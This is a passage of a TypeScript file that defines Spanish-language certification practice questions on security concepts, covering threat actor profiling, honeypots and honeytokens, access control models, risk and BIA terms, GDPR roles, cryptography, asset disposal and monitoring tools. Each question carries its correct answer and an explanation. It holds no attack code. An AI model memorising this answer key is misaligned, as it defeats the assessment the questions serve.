    'El equipo de inteligencia de amenazas (CTI) debe preparar el informe trimestral para la dirección. Recibes un resumen de incidentes observados en el sector y debes perfilar al actor y su motivación principal. Además, el SOC desplegó varias tecnologías de engaño y necesitas identificarlas correctamente en el informe.',
    [
      'Sección 1: identifica el tipo de actor de amenaza y su motivación principal.',
      'Sección 2: identifica la tecnología de engaño desplegada.',
    ],
    'Recursos ilimitados + sigilo durante meses = estado-nación (APT). Rescate o venta de datos = crimen organizado. Mensaje político = hacktivista. Acceso legítimo previo = insider. Herramientas descargadas sin entenderlas = unskilled attacker. Sin malicia, solo saltarse a TI = shadow IT.'
  ),
  config: {
    pbqId: 'pbq-56',
    consoleTitle: 'Informe CTI Trimestral (Objetivos 2.1 y 1.2)',
    instructions: 'Completa el perfil de cada incidente y la tabla de tecnologías de engaño.',
    sections: [
      {
        id: 's1',
        title: 'Perfil de actores',
        columns: [
          { id: 'actor', label: 'Actor de amenaza', options: ACTORS },
          { id: 'motivation', label: 'Motivación principal', options: MOTIVATIONS },
        ],
        rows: [
          {
            id: 't1',
            prompt: 'Un grupo con financiamiento gubernamental mantuvo acceso sigiloso durante 18 meses en un contratista de defensa y extrajo planos de misiles.',
            answers: { actor: 'nation_state', motivation: 'espionage' },
            explanation: 'Recursos de un gobierno, persistencia prolongada (APT) y robo de secretos: estado-nación con motivación de espionaje.',
          },
          {
            id: 't2',
            prompt: 'Un grupo cifra los servidores de un hospital y exige 40 BTC; tiene un "servicio de atención" para negociar con las víctimas.',
            answers: { actor: 'organized_crime', motivation: 'financial' },
            explanation: 'Estructura empresarial y rescate: crimen organizado con motivación financiera.',
          },
          {
            id: 't3',
            prompt: 'El sitio web de una petrolera aparece desfigurado con mensajes contra el cambio climático.',
            answers: { actor: 'hacktivist', motivation: 'philosophical' },
            explanation: 'Defacement con mensaje ideológico: hacktivista con creencias filosóficas/políticas.',
          },
          {
            id: 't4',
            prompt: 'Un administrador despedido usa una cuenta que nunca se deshabilitó para borrar los backups una semana después de su salida.',
            answers: { actor: 'insider', motivation: 'revenge' },
            explanation: 'Usa acceso legítimo previo (insider) y actúa por resentimiento (venganza). Lección: offboarding inmediato.',
          },
          {
            id: 't5',
            prompt: 'Un adolescente descarga una herramienta DDoS de un foro y la lanza contra el servidor de un videojuego "para ver qué pasa".',
            answers: { actor: 'unskilled', motivation: 'chaos' },
            explanation: 'Usa herramientas ajenas sin conocimiento profundo: unskilled attacker, buscando disrupción/caos.',
          },
          {
            id: 't6',
            prompt: 'El equipo de marketing contrata un servicio de almacenamiento en la nube sin aprobación de TI y sube allí la base de clientes.',
            answers: { actor: 'shadow_it', motivation: 'none' },
            explanation: 'Uso de tecnología no autorizada sin intención maliciosa: shadow IT. Sigue siendo un riesgo de fuga de datos.',
          },
          {
            id: 't7',
            prompt: 'Un ataque deja sin electricidad a una región de un país rival horas antes de una operación militar.',
            answers: { actor: 'nation_state', motivation: 'war' },
            explanation: 'Ataque a infraestructura crítica coordinado con acciones militares: estado-nación con motivación de guerra.',
          },
        ],
      },
      {
        id: 's2',
        title: 'Tecnologías de engaño',
        columns: [{ id: 'tech', label: 'Tecnología', options: DECEPTION }],
        rows: [
          {
            id: 'd1',
            prompt: 'Un único servidor falso con servicios vulnerables, aislado y monitoreado, para atraer y estudiar atacantes.',
            answers: { tech: 'honeypot' },
            explanation: 'Un sistema señuelo individual es un honeypot.',
          },
          {
            id: 'd2',
            prompt: 'Una red completa de servidores, estaciones y routers señuelo que simula un entorno real.',
            answers: { tech: 'honeynet' },
            explanation: 'Varios honeypots interconectados forman una honeynet.',
          },
          {
            id: 'd3',
            prompt: 'Un archivo llamado "contraseñas_admin.xlsx" en un recurso compartido que genera una alerta en cuanto alguien lo abre.',
            answers: { tech: 'honeyfile' },
            explanation: 'Un archivo señuelo atractivo es un honeyfile.',
          },
          {
            id: 'd4',
            prompt: 'Una clave de acceso de AWS falsa incrustada en un repositorio; cualquier intento de usarla alerta al SOC.',
            answers: { tech: 'honeytoken' },
            explanation: 'Un dato o credencial falsa cuyo uso delata al atacante es un honeytoken.',
          },
          {
            id: 'd5',
            prompt: 'El resolver DNS interno responde a los dominios C2 conocidos con la IP de un servidor controlado por el SOC.',
            answers: { tech: 'sinkhole' },
            explanation: 'Redirigir dominios maliciosos a un destino controlado es un DNS sinkhole; permite identificar hosts infectados.',
          },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 57 — Access control models, authentication factors and PAM (4.6 / 1.2)
// ---------------------------------------------------------------------------
const AC_MODELS = [
  o('mac', 'MAC (Mandatory Access Control)'),
  o('dac', 'DAC (Discretionary Access Control)'),
  o('rbac', 'RBAC (Role-Based Access Control)'),
  o('abac', 'ABAC (Attribute-Based Access Control)'),
  o('rule', 'Basado en reglas (Rule-based)'),
];
const AUTH_FACTORS = [
  o('know', 'Algo que sabes (Something you know)'),
  o('have', 'Algo que tienes (Something you have)'),
  o('are', 'Algo que eres (Something you are)'),
  o('where', 'Algún lugar donde estás (Somewhere you are)'),
];
const PAM_TOOLS = [
  o('jit', 'Permisos Just-in-Time (JIT)'),
  o('vaulting', 'Bóveda de contraseñas (Password vaulting)'),
  o('ephemeral', 'Credenciales efímeras (Ephemeral credentials)'),
];

const PBQ57: MatrixPbqDefinition = {
  item: item(
    57,
    'access-control-models',
    'Modelos de Acceso y Autenticación',
    'Modelos de Control de Acceso, Factores de Autenticación y PAM',
    ['4.6', ['1.2']],
    6,
    'La empresa unificará el control de acceso de varias aplicaciones heredadas tras una fusión. El arquitecto de identidad te pide documentar qué modelo de control de acceso usa cada sistema, qué factor de autenticación representa cada método que se ofrece a los usuarios y qué herramienta de gestión de acceso privilegiado (PAM) describe cada requisito del proyecto.',
    [
      'Sección 1: identifica el modelo de control de acceso de cada sistema.',
      'Sección 2: clasifica cada método de autenticación por su factor.',
      'Sección 3: identifica la herramienta PAM correspondiente.',
    ],
    'MAC = etiquetas de clasificación que el usuario NO puede cambiar. DAC = el dueño del recurso decide. RBAC = permisos por puesto/rol. ABAC = combinación de atributos (usuario, recurso, entorno). Rule-based = reglas globales iguales para todos (p. ej. horario). Un código TOTP es "algo que tienes" (el dispositivo con la semilla), no "algo que sabes".'
  ),
  config: {
    pbqId: 'pbq-57',
    consoleTitle: 'Inventario de Identidad Post-Fusión (Objetivo 4.6)',
    instructions: 'Completa las tres tablas del inventario de identidad.',
    sections: [
      {
        id: 's1',
        title: 'Modelo de control de acceso',
        columns: [{ id: 'model', label: 'Modelo', options: AC_MODELS }],
        rows: [
          {
            id: 'm1',
            prompt: 'Los documentos están etiquetados como Confidencial, Secreto o Alto Secreto; solo se leen con una autorización igual o superior y el usuario no puede cambiar las etiquetas.',
            answers: { model: 'mac' },
            explanation: 'Etiquetas y niveles de autorización impuestos por el sistema/administrador: MAC.',
          },
          {
            id: 'm2',
            prompt: 'En el servidor de archivos, el creador de cada carpeta decide a quién otorga permisos de lectura o escritura.',
            answers: { model: 'dac' },
            explanation: 'El propietario del recurso controla el acceso: DAC (modelo de NTFS por defecto).',
          },
          {
            id: 'm3',
            prompt: 'Los permisos del ERP se asignan al puesto "Contador"; cuando alguien cambia de puesto pierde esos permisos y recibe los del nuevo.',
            answers: { model: 'rbac' },
            explanation: 'Permisos ligados al rol/puesto de trabajo: RBAC.',
          },
          {
            id: 'm4',
            prompt: 'El acceso al portal de nómina se concede si departamento = Finanzas Y dispositivo = gestionado Y país = Argentina.',
            answers: { model: 'abac' },
            explanation: 'Evalúa múltiples atributos del usuario, del recurso y del contexto: ABAC.',
          },
          {
            id: 'm5',
            prompt: 'El sistema de control de producción solo permite iniciar sesión de lunes a viernes de 08:00 a 18:00 a cualquier usuario.',
            answers: { model: 'rule' },
            explanation: 'Una regla global aplicada a todos, independientemente de la identidad: rule-based (restricción horaria).',
          },
        ],
      },
      {
        id: 's2',
        title: 'Factores de autenticación',
        columns: [{ id: 'factor', label: 'Factor', options: AUTH_FACTORS }],
        rows: [
          { id: 'f1', prompt: 'PIN de 6 dígitos para desbloquear el portátil.', answers: { factor: 'know' }, explanation: 'Un secreto memorizado: algo que sabes.' },
          { id: 'f2', prompt: 'Llave de seguridad FIDO2 conectada por USB.', answers: { factor: 'have' }, explanation: 'Un token físico: algo que tienes.' },
          { id: 'f3', prompt: 'Código de 6 dígitos generado por una app autenticadora (TOTP).', answers: { factor: 'have' }, explanation: 'El código prueba la posesión del dispositivo con la semilla: algo que tienes.' },
          { id: 'f4', prompt: 'Lector de huella dactilar en el control de acceso.', answers: { factor: 'are' }, explanation: 'Biometría: algo que eres.' },
          { id: 'f5', prompt: 'El acceso solo se permite si la IP del usuario se geolocaliza dentro de la oficina.', answers: { factor: 'where' }, explanation: 'Basado en ubicación: algún lugar donde estás.' },
          { id: 'f6', prompt: 'Respuesta a la pregunta "¿Nombre de tu primera mascota?".', answers: { factor: 'know' }, explanation: 'Sigue siendo un conocimiento: contraseña + pregunta de seguridad NO es MFA (mismo factor dos veces).' },
        ],
      },
      {
        id: 's3',
        title: 'Gestión de acceso privilegiado (PAM)',
        columns: [{ id: 'tool', label: 'Herramienta PAM', options: PAM_TOOLS }],
        rows: [
          { id: 'k1', prompt: 'Las contraseñas de las cuentas de administrador se guardan en una bóveda y se rotan automáticamente después de cada uso.', answers: { tool: 'vaulting' }, explanation: 'Almacenar y rotar credenciales privilegiadas: password vaulting.' },
          { id: 'k2', prompt: 'Los permisos de administrador del dominio se conceden solo por 1 hora tras aprobación del jefe y luego se revocan.', answers: { tool: 'jit' }, explanation: 'Privilegios temporales concedidos bajo demanda: just-in-time.' },
          { id: 'k3', prompt: 'Para cada sesión de mantenimiento se genera una credencial única que deja de existir al cerrar la sesión.', answers: { tool: 'ephemeral' }, explanation: 'Credenciales de un solo uso con vida corta: ephemeral credentials.' },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 58 — Risk management concepts and BIA (5.2)
// ---------------------------------------------------------------------------
const RISK_TERMS = [
  o('appetite', 'Apetito de riesgo (Risk appetite)'),
  o('tolerance', 'Tolerancia al riesgo (Risk tolerance)'),
  o('register', 'Registro de riesgos (Risk register)'),
  o('owner', 'Dueño del riesgo (Risk owner)'),
  o('kri', 'Indicador clave de riesgo (KRI)'),
  o('inherent', 'Riesgo inherente'),
  o('residual', 'Riesgo residual'),
  o('exception', 'Excepción / exención de riesgo'),
  o('mttr', 'MTTR'),
  o('mtbf', 'MTBF'),
  o('rto', 'RTO'),
  o('rpo', 'RPO'),
];

const PBQ58: MatrixPbqDefinition = {
  item: item(
    58,
    'risk-concepts',
    'Gestión de Riesgos',
    'Terminología de Gestión de Riesgos y Análisis de Impacto al Negocio (BIA)',
    ['5.2', ['3.4']],
    5,
    'El comité de riesgos prepara el informe anual para el directorio. Se te entregan extractos del informe y del análisis de impacto al negocio (BIA) del e-commerce: identifica el término de gestión de riesgos que corresponde a cada extracto.',
    [
      'Relaciona cada extracto con el término de gestión de riesgos o de BIA correcto.',
      'Distingue apetito (estrategia general) de tolerancia (desviación aceptable concreta).',
      'Distingue métricas de recuperación (RTO/RPO) de métricas de fiabilidad (MTTR/MTBF).',
    ],
    'RPO = cuántos DATOS (medidos en tiempo) puedes perder → define la frecuencia de backup. RTO = cuánto TIEMPO puede estar caído el servicio. MTBF = tiempo promedio ENTRE fallos (fiabilidad). MTTR = tiempo promedio para REPARAR. Inherente = antes de controles; residual = después.'
  ),
  config: {
    pbqId: 'pbq-58',
    consoleTitle: 'Informe Anual de Riesgos y BIA (Objetivo 5.2)',
    instructions: 'Selecciona el término que describe cada extracto.',
    sections: [
      {
        id: 's1',
        title: 'Extractos del informe',
        columns: [{ id: 'term', label: 'Término', options: RISK_TERMS }],
        rows: [
          { id: 'k1', prompt: 'El directorio declara que acepta niveles moderados de riesgo para crecer rápidamente en nuevos mercados.', answers: { term: 'appetite' }, explanation: 'Cantidad y tipo de riesgo que la organización está dispuesta a asumir para lograr sus objetivos (apetito expansivo).' },
          { id: 'k2', prompt: 'Se acepta como máximo 4 horas de indisponibilidad del e-commerce por trimestre antes de escalar al directorio.', answers: { term: 'tolerance' }, explanation: 'Desviación específica y medible aceptable respecto al objetivo: tolerancia.' },
          { id: 'k3', prompt: 'Documento que lista cada riesgo con su probabilidad, impacto, responsable, controles y estado.', answers: { term: 'register' }, explanation: 'El risk register centraliza la información de cada riesgo identificado.' },
          { id: 'k4', prompt: 'El director de RR.HH. es responsable de gestionar y aceptar el riesgo del sistema de nómina.', answers: { term: 'owner' }, explanation: 'La persona que rinde cuentas por un riesgo concreto es el risk owner.' },
          { id: 'k5', prompt: 'Métrica mensual: "% de servidores con parches críticos pendientes hace más de 30 días", con alerta si supera el 5%.', answers: { term: 'kri' }, explanation: 'Métrica con umbral que anticipa el aumento de un riesgo: KRI.' },
          { id: 'k6', prompt: 'Nivel de riesgo del ataque de ransomware si la empresa no tuviera ningún control implementado.', answers: { term: 'inherent' }, explanation: 'Riesgo antes de aplicar controles: inherente.' },
          { id: 'k7', prompt: 'Nivel de riesgo que permanece después de implementar EDR, backups inmutables y MFA.', answers: { term: 'residual' }, explanation: 'Riesgo remanente tras los controles: residual. Debe estar dentro del apetito de riesgo.' },
          { id: 'k8', prompt: 'Un sistema legado no puede cumplir la política de cifrado; la dirección aprueba formalmente y por 6 meses el incumplimiento con controles compensatorios.', answers: { term: 'exception' }, explanation: 'Aprobación formal y temporal para no cumplir una política: excepción/exención.' },
          { id: 'k9', prompt: 'En promedio, el equipo tarda 3 horas en reparar y devolver al servicio un servidor que falla.', answers: { term: 'mttr' }, explanation: 'Mean Time To Repair: tiempo promedio de reparación.' },
          { id: 'k10', prompt: 'Los discos de la cabina funcionan en promedio 120.000 horas entre una falla y la siguiente.', answers: { term: 'mtbf' }, explanation: 'Mean Time Between Failures: mide la fiabilidad del componente.' },
          { id: 'k11', prompt: 'El negocio no puede perder más de 15 minutos de pedidos; por eso la base de datos se replica cada 15 minutos.', answers: { term: 'rpo' }, explanation: 'Pérdida máxima de datos aceptable medida en tiempo: RPO. Determina la frecuencia de backup/replicación.' },
          { id: 'k12', prompt: 'Tras un desastre, el e-commerce debe volver a estar operativo en un máximo de 2 horas.', answers: { term: 'rto' }, explanation: 'Tiempo máximo para restaurar el servicio: RTO. Determina el tipo de sitio de recuperación.' },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 59 — Compliance, privacy and security awareness (5.4 / 5.6)
// ---------------------------------------------------------------------------
const COMPLIANCE_TERMS = [
  o('controller', 'Responsable del tratamiento (Data controller)'),
  o('processor', 'Encargado del tratamiento (Data processor)'),
  o('subject', 'Titular de los datos (Data subject)'),
  o('right_forgotten', 'Derecho al olvido'),
  o('fines', 'Multas (Fines)'),
  o('loss_license', 'Pérdida de licencia'),
  o('reputation', 'Daño reputacional'),
  o('phishing_campaign', 'Campaña de phishing simulado'),
  o('risky', 'Comportamiento riesgoso (Risky)'),
  o('unexpected', 'Comportamiento inesperado (Unexpected)'),
  o('unintentional', 'Comportamiento no intencional (Unintentional)'),
];

const PBQ59: MatrixPbqDefinition = {
  item: item(
    59,
    'compliance-awareness',
    'Cumplimiento y Concienciación',
    'Cumplimiento Normativo, Privacidad y Programa de Concienciación',
    ['5.4', ['5.6']],
    5,
    'La empresa procesa datos de clientes europeos y pagos con tarjeta. El Data Protection Officer prepara la capacitación anual y el informe de cumplimiento, e incluye casos reales del último año. Identifica el rol de privacidad, la consecuencia de incumplimiento o el comportamiento que ilustra cada caso para el programa de concienciación.',
    [
      'Identifica los roles de privacidad (responsable, encargado, titular) y derechos de los titulares.',
      'Identifica las consecuencias de incumplimiento.',
      'Clasifica los comportamientos anómalos que el programa de concienciación enseña a reconocer.',
    ],
    'Controller = DECIDE para qué y cómo se tratan los datos (normalmente tu empresa). Processor = trata los datos POR CUENTA del controller (el proveedor SaaS). Comportamiento: riesgoso = el usuario sabe que hace algo arriesgado; inesperado = se desvía del patrón normal; no intencional = error sin intención.'
  ),
  config: {
    pbqId: 'pbq-59',
    consoleTitle: 'Informe de Cumplimiento y Capacitación Anual (Objetivos 5.4 y 5.6)',
    instructions: 'Clasifica cada caso con el término correcto. Algunas opciones pueden no usarse.',
    sections: [
      {
        id: 's1',
        title: 'Casos del año',
        columns: [{ id: 'term', label: 'Término', options: COMPLIANCE_TERMS }],
        rows: [
          { id: 'c1', prompt: 'La empresa decide qué datos personales recoge de sus clientes y con qué finalidad.', answers: { term: 'controller' }, explanation: 'Quien determina finalidades y medios del tratamiento es el responsable (controller).' },
          { id: 'c2', prompt: 'El proveedor SaaS de nómina procesa los datos de los empleados siguiendo las instrucciones de la empresa.', answers: { term: 'processor' }, explanation: 'Trata los datos por cuenta del controller: encargado (processor).' },
          { id: 'c3', prompt: 'Una clienta de Madrid cuyos datos personales están en el CRM de la empresa.', answers: { term: 'subject' }, explanation: 'La persona identificable a quien pertenecen los datos es el titular (data subject).' },
          { id: 'c4', prompt: 'Un cliente solicita que se eliminen todos sus datos personales y la empresa debe borrarlos de sus sistemas.', answers: { term: 'right_forgotten' }, explanation: 'Derecho de supresión del GDPR: derecho al olvido.' },
          { id: 'c5', prompt: 'El regulador europeo impone una sanción equivalente al 2% de la facturación anual por una brecha no notificada.', answers: { term: 'fines' }, explanation: 'Sanción económica impuesta por un regulador: multa.' },
          { id: 'c6', prompt: 'Tras incumplir PCI DSS reiteradamente, el comercio pierde la autorización para procesar pagos con tarjeta.', answers: { term: 'loss_license' }, explanation: 'Perder la autorización para operar una actividad regulada es pérdida de licencia.' },
          { id: 'c7', prompt: 'Un empleado hace clic en un correo falso enviado por el equipo de seguridad y es redirigido a una micro-capacitación.', answers: { term: 'phishing_campaign' }, explanation: 'Las campañas de phishing simulado miden y entrenan la capacidad de reconocimiento.' },
          { id: 'c8', prompt: 'Un empleado conecta a su estación de trabajo un USB que encontró en el estacionamiento.', answers: { term: 'risky' }, explanation: 'Acción que el usuario podría saber que es peligrosa: comportamiento riesgoso.' },
          { id: 'c9', prompt: 'Un empleado del área contable inicia sesión a las 3:00 desde un país donde la empresa no opera.', answers: { term: 'unexpected' }, explanation: 'Se desvía del patrón normal del usuario: comportamiento inesperado (posible cuenta comprometida).' },
          { id: 'c10', prompt: 'Una analista envía por error la planilla de sueldos a un destinatario externo con un nombre parecido al de su jefe.', answers: { term: 'unintentional' }, explanation: 'Error sin intención maliciosa: comportamiento no intencional.' },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 61 — Cryptographic concepts and key-protection tools (1.4)
// ---------------------------------------------------------------------------
const CRYPTO_TECHNIQUES = [
  o('hashing', 'Hashing'),
  o('salting', 'Salting'),
  o('stretching', 'Key stretching'),
  o('signature', 'Firma digital'),
  o('symmetric', 'Cifrado simétrico'),
  o('asymmetric', 'Cifrado asimétrico'),
  o('key_exchange', 'Intercambio de claves'),
  o('steganography', 'Esteganografía'),
  o('tokenization', 'Tokenización'),
];
const KEY_TOOLS = [
  o('tpm', 'TPM (Trusted Platform Module)'),
  o('hsm', 'HSM (Hardware Security Module)'),
  o('kms', 'KMS (Key Management Service)'),
  o('enclave', 'Secure enclave'),
  o('escrow', 'Key escrow'),
];

const PBQ61: MatrixPbqDefinition = {
  item: item(
    61,
    'crypto-concepts',
    'Conceptos Criptográficos',
    'Hashing, Salting, Key Stretching, Firmas Digitales y Protección de Claves',
    ['1.4', []],
    5,
    'El equipo de arquitectura documenta cómo se protege la información en cada sistema de la empresa. Te piden identificar la técnica criptográfica que describe cada control y la herramienta que protege las claves en cada caso, para el informe que revisará el auditor.',
    [
      'Sección 1: identifica la técnica criptográfica descrita en cada control.',
      'Sección 2: identifica la herramienta de protección de claves de cada caso.',
    ],
    'Hash = integridad, irreversible y de longitud fija. Salt = valor aleatorio por usuario contra rainbow tables. Key stretching (PBKDF2, bcrypt) = muchas iteraciones para frenar la fuerza bruta. Firma = hash cifrado con la clave PRIVADA del emisor (integridad + no repudio). Para confidencialidad hacia un destinatario se usa SU clave PÚBLICA. TPM = chip del equipo; HSM = appliance dedicado; KMS = servicio cloud.'
  ),
  config: {
    pbqId: 'pbq-61',
    consoleTitle: 'Inventario Criptográfico Corporativo (Objetivo 1.4)',
    instructions: 'Selecciona la técnica o herramienta que corresponde a cada control.',
    sections: [
      {
        id: 's1',
        title: 'Técnicas criptográficas',
        columns: [{ id: 'technique', label: 'Técnica', options: CRYPTO_TECHNIQUES }],
        rows: [
          { id: 'c1', prompt: 'El portal guarda un valor de longitud fija derivado de cada contraseña, que no puede revertirse para obtener la original.', answers: { technique: 'hashing' }, explanation: 'Función unidireccional de longitud fija: hashing. No es cifrado porque no existe clave para revertirlo.' },
          { id: 'c2', prompt: 'Antes de calcular el hash se añade un valor aleatorio único por usuario, así dos usuarios con la misma contraseña tienen hashes distintos y las rainbow tables no sirven.', answers: { technique: 'salting' }, explanation: 'El salt aleatorio por cuenta inutiliza las tablas precalculadas.' },
          { id: 'c3', prompt: 'La contraseña se procesa con bcrypt/PBKDF2 aplicando miles de iteraciones para que cada intento de fuerza bruta sea lento.', answers: { technique: 'stretching' }, explanation: 'Aumentar el costo computacional de derivar la clave es key stretching.' },
          { id: 'c4', prompt: 'El CFO firma un contrato con su clave privada; el receptor lo verifica con la clave pública del CFO y así este no puede negar haberlo enviado.', answers: { technique: 'signature' }, explanation: 'Firma digital: integridad, autenticación y no repudio.' },
          { id: 'c5', prompt: 'Un disco de 2 TB se cifra rápidamente con AES-256 usando una única clave secreta.', answers: { technique: 'symmetric' }, explanation: 'Una sola clave compartida y alto rendimiento para grandes volúmenes: cifrado simétrico.' },
          { id: 'c6', prompt: 'Un correo se cifra con la clave pública del destinatario para que solo su clave privada pueda descifrarlo.', answers: { technique: 'asymmetric' }, explanation: 'Par de claves pública/privada: cifrado asimétrico. Para confidencialidad se usa la clave pública del DESTINATARIO.' },
          { id: 'c7', prompt: 'Dos servidores acuerdan una clave de sesión secreta a través de Internet sin transmitir nunca la clave (Diffie-Hellman).', answers: { technique: 'key_exchange' }, explanation: 'Diffie-Hellman/ECDHE es un mecanismo de intercambio de claves; con claves efímeras aporta Perfect Forward Secrecy.' },
          { id: 'c8', prompt: 'Un empleado oculta datos robados dentro de los bits menos significativos de fotos que sube a una red social.', answers: { technique: 'steganography' }, explanation: 'Ocultar la existencia de la información dentro de otro archivo es esteganografía (oculta, no cifra).' },
        ],
      },
      {
        id: 's2',
        title: 'Protección de claves',
        columns: [{ id: 'tool', label: 'Herramienta', options: KEY_TOOLS }],
        rows: [
          { id: 'k1', prompt: 'Chip en la placa base del portátil que guarda la clave de BitLocker y verifica la integridad del arranque.', answers: { tool: 'tpm' }, explanation: 'El TPM está integrado en el equipo y ancla el cifrado de disco y el arranque medido.' },
          { id: 'k2', prompt: 'Appliance dedicado y certificado FIPS 140 en el data center de la CA interna que genera y protege las claves privadas raíz.', answers: { tool: 'hsm' }, explanation: 'Dispositivo de hardware dedicado, resistente a manipulación y de alto rendimiento: HSM.' },
          { id: 'k3', prompt: 'Servicio del proveedor cloud para crear, rotar y auditar las claves que cifran los buckets de almacenamiento.', answers: { tool: 'kms' }, explanation: 'Gestión centralizada de claves como servicio: KMS.' },
          { id: 'k4', prompt: 'Zona aislada del procesador del teléfono que procesa la huella y las claves sin exponerlas al sistema operativo.', answers: { tool: 'enclave' }, explanation: 'Secure enclave: coprocesador aislado dentro del SoC.' },
          { id: 'k5', prompt: 'Un tercero de confianza guarda una copia de las claves de cifrado para recuperarlas si se pierden o por orden judicial.', answers: { tool: 'escrow' }, explanation: 'Depositar claves con un tercero para su recuperación es key escrow.' },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 65 — Hardware, software and data asset management (4.2)
// ---------------------------------------------------------------------------
const ASSET_LIFECYCLE = [
  o('procurement', 'Adquisición (Procurement)'),
  o('assignment', 'Asignación de propietario (Ownership)'),
  o('classification', 'Clasificación'),
  o('inventory', 'Inventario y seguimiento (Inventory / Tracking)'),
  o('enumeration', 'Enumeración'),
  o('decommission', 'Desmantelamiento (Decommissioning)'),
];
const ASSET_DISPOSAL = [
  o('sanitization', 'Sanitización'),
  o('destruction', 'Destrucción'),
  o('certification', 'Certificación'),
  o('retention', 'Retención de datos'),
];

const PBQ65: MatrixPbqDefinition = {
  item: item(
    65,
    'asset-management',
    'Gestión de Activos',
    'Ciclo de Vida de Activos: Adquisición, Inventario, Baja Segura y Retención',
    ['4.2', ['3.3']],
    4,
    'La auditoría interna detectó portátiles sin dueño asignado, servidores que no figuran en la CMDB y discos dados de baja sin constancia de borrado. El CISO te pide documentar el proceso de gestión de activos: identifica la etapa del ciclo de vida que describe cada actividad y el tipo de control de baja que se aplica en cada caso.',
    [
      'Sección 1: identifica la etapa del ciclo de vida del activo que describe cada actividad.',
      'Sección 2: identifica el control de baja y eliminación de datos de cada caso.',
    ],
    'Adquisición = la seguridad entra ANTES de comprar (proveedor, soporte, firmware). Asignación = cada activo tiene un dueño responsable. Inventario = registro que se mantiene actualizado; enumeración = descubrir qué existe realmente en la red. En la baja: sanitizar = el medio puede reutilizarse; destruir = el medio deja de existir; certificación = la constancia documental de que se hizo; retención = cuánto tiempo DEBE conservarse antes de eliminarse.'
  ),
  config: {
    pbqId: 'pbq-65',
    consoleTitle: 'Procedimiento de Gestión de Activos (Objetivo 4.2)',
    instructions: 'Selecciona la etapa o el control que corresponde a cada actividad. Algunas opciones pueden no usarse y otras repetirse.',
    sections: [
      {
        id: 's1',
        title: 'Ciclo de vida del activo',
        columns: [{ id: 'stage', label: 'Etapa', options: ASSET_LIFECYCLE }],
        rows: [
          { id: 'a1', prompt: 'Antes de comprar 200 portátiles, seguridad exige que el fabricante garantice actualizaciones de firmware durante 5 años y aprueba la compra en el proceso de compras.', answers: { stage: 'procurement' }, explanation: 'Evaluar proveedor, soporte y requisitos de seguridad antes de la compra es parte de la adquisición (procurement).' },
          { id: 'a2', prompt: 'Cada servidor registrado en la CMDB tiene una persona responsable que decide su ventana de parches y aprueba los accesos.', answers: { stage: 'assignment' }, explanation: 'Asignar un dueño (owner) responsable a cada activo es la etapa de asignación/propiedad; sin dueño nadie rinde cuentas por su seguridad.' },
          { id: 'a3', prompt: 'La base de datos con historiales médicos se etiqueta como "Restringida" para que se le apliquen cifrado y controles de acceso más estrictos.', answers: { stage: 'classification' }, explanation: 'Etiquetar el activo según la sensibilidad de los datos que contiene es clasificación; de ella dependen los controles que se aplican.' },
          { id: 'a4', prompt: 'Un agente informa a diario el hardware y software instalado en cada equipo a la CMDB y alerta si un número de serie desaparece.', answers: { stage: 'inventory' }, explanation: 'Mantener actualizado el registro de activos y su ubicación/estado es inventario y seguimiento (asset tracking).' },
          { id: 'a5', prompt: 'Un barrido de la red descubre todos los dispositivos conectados, incluida una Raspberry Pi que no figura en ningún registro.', answers: { stage: 'enumeration' }, explanation: 'Descubrir activamente qué existe en la red es enumeración; sirve para encontrar shadow IT y activos no inventariados.' },
          { id: 'a6', prompt: 'Los servidores que terminaron su vida útil se apagan, se retiran de la CMDB, se revocan sus certificados y sus discos pasan al proceso de borrado.', answers: { stage: 'decommission' }, explanation: 'Retirar el activo de producción de forma controlada es desmantelamiento (decommissioning), el inicio de la baja segura.' },
        ],
      },
      {
        id: 's2',
        title: 'Baja y eliminación de datos',
        columns: [{ id: 'control', label: 'Control', options: ASSET_DISPOSAL }],
        rows: [
          { id: 'd1', prompt: 'Los discos de los portátiles devueltos se sobrescriben según NIST SP 800-88 porque se entregarán a otro departamento.', answers: { control: 'sanitization' }, explanation: 'Si el medio se va a reutilizar, se sanitiza (clear/purge); destruirlo sería innecesario.' },
          { id: 'd2', prompt: 'Un SSD averiado que contenía datos de tarjetas se tritura porque no puede borrarse de forma confiable.', answers: { control: 'destruction' }, explanation: 'Cuando el medio no se reutilizará o no puede sanitizarse, se destruye físicamente (triturado, desintegración, incineración).' },
          { id: 'd3', prompt: 'El proveedor de reciclaje entrega un documento firmado con los números de serie de cada disco destruido.', answers: { control: 'certification' }, explanation: 'La constancia documental de la sanitización o destrucción es la certificación; es la evidencia que pide el auditor.' },
          { id: 'd4', prompt: 'Los registros contables se conservan 7 años por exigencia legal y recién después se eliminan.', answers: { control: 'retention' }, explanation: 'La política de retención define cuánto tiempo deben conservarse los datos antes de eliminarse; borrarlos antes también es un incumplimiento.' },
          { id: 'd5', prompt: 'Para dar de baja un volumen cloud cifrado, se eliminan de forma irreversible las claves en el KMS (crypto-erase).', answers: { control: 'sanitization' }, explanation: 'El borrado criptográfico es una técnica de sanitización (purge en NIST SP 800-88): sin la clave, los datos quedan ilegibles.' },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 66 — Alerting and monitoring concepts and tools (4.4)
// ---------------------------------------------------------------------------
const MONITORING_TOOLS = [
  o('siem', 'SIEM'),
  o('scap', 'SCAP'),
  o('benchmark', 'Benchmark (CIS)'),
  o('netflow', 'NetFlow'),
  o('snmp_trap', 'SNMP trap'),
  o('vuln_scanner', 'Escáner de vulnerabilidades'),
  o('agent', 'Monitoreo con agente'),
  o('agentless', 'Monitoreo sin agente'),
  o('dlp', 'DLP'),
];
const MONITORING_ACTIVITIES = [
  o('aggregation', 'Agregación de logs'),
  o('alerting', 'Alertas'),
  o('tuning', 'Ajuste de alertas (Alert tuning)'),
  o('quarantine', 'Cuarentena'),
  o('archiving', 'Archivado'),
  o('reporting', 'Reportes'),
];

const PBQ66: MatrixPbqDefinition = {
  item: item(
    66,
    'security-monitoring',
    'Alertas y Monitoreo',
    'Herramientas de Monitoreo de Seguridad y Actividades del SOC',
    ['4.4', ['4.9']],
    4,
